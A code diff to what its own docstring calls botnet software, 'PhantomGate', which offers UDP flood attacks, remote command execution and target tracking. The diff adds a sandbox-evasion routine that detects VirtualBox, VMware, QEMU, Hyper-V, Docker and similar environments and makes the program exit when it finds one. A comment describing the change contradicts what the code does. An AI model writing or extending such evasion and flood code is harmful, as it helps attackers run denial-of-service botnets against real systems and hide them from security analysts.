@@ -27,6 +27,7 @@ Main Features:
     - Supports command execution with output capture
     - Handles target data management in a SQLite database
     - Supports adaptive rate control for UDP flood attacks
+    - checks if it is running in vm or not,if so keep running other than that exit
 
 API Endpoints (default: {config.url}):
     /api/register_target      Register a new target
@@ -1065,5 +1066,64 @@ def main():
         # Uncomment the line below to enable targetData functionality
         # print(targetData(command='get'))  # Example target data retrieval
 
+
+def is_virtual_env():
+    """
+    Checks if the script is running inside a virtual machine or isolated environment.
+    Returns:
+        bool: True if running in a VM or container, False otherwise.
+    """
+    # Check for common VM vendors in system product name
+    vm_indicators = [
+        "virtualbox", "vmware", "kvm", "qemu", "hyper-v", "xen", "bochs", "parallels", "bhyve"
+    ]
+    try:
+        # Linux: check /sys/class/dmi/id/product_name
+        if os.path.exists("/sys/class/dmi/id/product_name"):
+            with open("/sys/class/dmi/id/product_name") as f:
+                product_name = f.read().lower()
+                if any(vm in product_name for vm in vm_indicators):
+                    return True
+        # Windows: use wmic
+        if sys.platform == "win32":
+            import subprocess
+            try:
+                output = subprocess.check_output("wmic computersystem get model", shell=True).decode().lower()
+                if any(vm in output for vm in vm_indicators):
+                    return True
+            except Exception:
+                pass
+        # Check for container environment
+        if os.path.exists("/.dockerenv") or os.path.exists("/.containerenv"):
+            return True
+        # Check cgroup for docker/lxc
+        if os.path.exists("/proc/1/cgroup"):
+            with open("/proc/1/cgroup") as f:
+                cgroup = f.read()
+                if "docker" in cgroup or "lxc" in cgroup:
+                    return True
+    except Exception:
+        pass
+    return False
+
 if __name__ == '__main__':
+    # Initialize logging
+    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+    # Start the main function
+    print("Starting PhantomGate...")
+    if not config.url:
+        print("API URL is not set. Please configure the API URL in config.py.")
+    else:
+        print(f"Connecting to API at {config.url} with token {apiToken}")
+    # Call the main function to start the botnet operations
+    if apiToken == 'notSet':
+        print("API token is not set. Please configure the API token in config.py.")
+    else:
+        print(f"Using API token: {apiToken}")
+        # Start the main botnet operations
+    # Check if running in a virtual machine or isolated environment
+    print("Checking if running in a VM or isolated environment...")
+    if is_virtual_env():
+        print("Running in a VM or isolated environment. Exiting.")
+        sys.exit(0)
     main()
